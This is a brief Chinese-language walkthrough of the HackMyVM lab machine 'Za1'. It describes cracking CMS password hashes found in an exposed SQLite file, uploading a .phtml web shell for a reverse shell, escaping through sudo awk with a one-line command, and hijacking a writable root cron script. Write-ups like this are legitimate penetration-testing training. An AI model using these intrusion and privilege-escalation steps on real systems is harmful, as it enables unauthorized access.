# Za1

2025.03.23 https://hackmyvm.eu/machines/machine.php?vm=Za1

[video](https://www.bilibili.com/video/BV1MSXaY5EBb/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描发现 http://192.168.5.40/usr/64c0dcaf26f51.db 是 sqlite 数据库，打开查看，发现 user 表：

```
zacarx:$P$BhtuFbhEVoGBElFj8n2HXUwtq5qiMR.
admin:$P$BERw7FPX6NWOVdTHpxON5aaj8VGMFs0
```

john 爆破，admin 密码为 123456 ，在站点管理中 http://192.168.5.40/admin/options-general.php 最底部添加可以上传 phtml 文件。

在编辑功能区中，编辑一个文章，选择上传附件，把这个 phtml 上传，就能得到文件的 url http://192.168.5.40/usr/uploads/2025/03/4121376413.phtml 访问后得到反弹的 shll。

user flag：

```
www-data@za_1:/home/za_1$ cat user.txt
flag{ThursD0y_v_wo_50}
```

sudo -l -> (za_1) NOPASSWD: /usr/bin/awk

```
sudo -u za_1 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

pspy 发现 root 定时执行脚本 /bin/sh -c /bin/bash /home/za_1/.root/back.sh 并且当前用户对脚本可以修改，直接修改成反弹 shell 内容，等待反弹到 kali 上。

root flag:

```
root@za_1:~# cat root.txt
flag{qq_group_169232653}
```
